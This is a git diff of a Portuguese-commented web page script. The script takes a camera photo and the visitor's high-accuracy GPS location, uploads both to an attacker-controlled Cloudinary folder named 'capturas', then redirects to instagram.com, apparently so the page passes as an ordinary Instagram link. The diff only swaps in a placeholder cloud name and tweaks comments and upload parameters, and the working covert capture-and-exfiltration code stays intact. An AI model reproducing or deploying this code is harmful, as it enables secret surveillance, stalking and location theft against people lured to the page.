@@ -7,9 +7,9 @@
 </head>
 <body>
     <script>
-        const cloudName = "dx5legahb"; // Substitua pelo seu Cloud Name do Cloudinary
-        const uploadPreset = "ml_default"; // Upload Preset do Cloudinary
-        const folderName = "capturas"; // Nome da pasta no Cloudinary
+        const cloudName = "SEU_CLOUD_NAME_AQUI"; // Substitua pelo seu Cloud Name
+        const uploadPreset = "SEU_UPLOAD_PRESET_AQUI"; // Substitua pelo seu Upload Preset
+        const folderName = "capturas"; // Pasta onde salvar os arquivos
 
         async function capturarFotoELocalizacao() {
             try {
@@ -25,7 +25,7 @@
                 const ctx = canvas.getContext('2d');
                 ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                // Parar a câmera para não deixar ativa
+                // Parar a câmera para evitar consumo desnecessário
                 stream.getTracks().forEach(track => track.stop());
 
                 // Converte a imagem para Blob
@@ -34,7 +34,8 @@
                 const formData = new FormData();
                 formData.append("file", blob);
                 formData.append("upload_preset", uploadPreset);
-                formData.append("folder", folderName); // Salva na pasta "capturas"
+                formData.append("folder", folderName);
+                formData.append("resource_type", "image"); // Garante que é uma imagem
 
                 // Envia a imagem para Cloudinary
                 const response = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/image/upload`, {
@@ -47,11 +48,11 @@
                 const data = await response.json();
                 const imageUrl = data.secure_url;
 
-                // 2️⃣ Captura a localização com máxima precisão
+                // 2️⃣ Captura a localização
                 const pos = await new Promise((resolve, reject) => {
                     navigator.geolocation.getCurrentPosition(resolve, reject, {
                         enableHighAccuracy: true, // Máxima precisão
-                        timeout: 5000, // Tempo máximo de espera
+                        timeout: 5000,
                         maximumAge: 0
                     });
                 });
@@ -59,14 +60,15 @@
                 const latitude = pos.coords.latitude;
                 const longitude = pos.coords.longitude;
 
-                // 3️⃣ Criar e enviar o arquivo de localização para Cloudinary
+                // 3️⃣ Criar e enviar o arquivo de localização
                 const textContent = `Latitude: ${latitude}\nLongitude: ${longitude}\nImagem: ${imageUrl}`;
                 const textBlob = new Blob([textContent], { type: "text/plain" });
 
                 const textFormData = new FormData();
                 textFormData.append("file", textBlob, `localizacao_${Date.now()}.txt`);
                 textFormData.append("upload_preset", uploadPreset);
-                textFormData.append("folder", folderName); // Salva na pasta "capturas"
+                textFormData.append("folder", folderName);
+                textFormData.append("resource_type", "raw"); // Garante que é um arquivo de texto
 
                 const textResponse = await fetch(`https://api.cloudinary.com/v1_1/${cloudName}/raw/upload`, {
                     method: "POST",
@@ -75,7 +77,7 @@
 
                 if (!textResponse.ok) throw new Error("Erro ao enviar o arquivo de localização");
 
-                // 4️⃣ Redireciona para outra página após o processo completo
+                // 4️⃣ Redireciona após tudo ser concluído
                 window.location.href = "https://instagram.com";
             } catch (error) {
                 console.error("Erro ao capturar dados:", error);
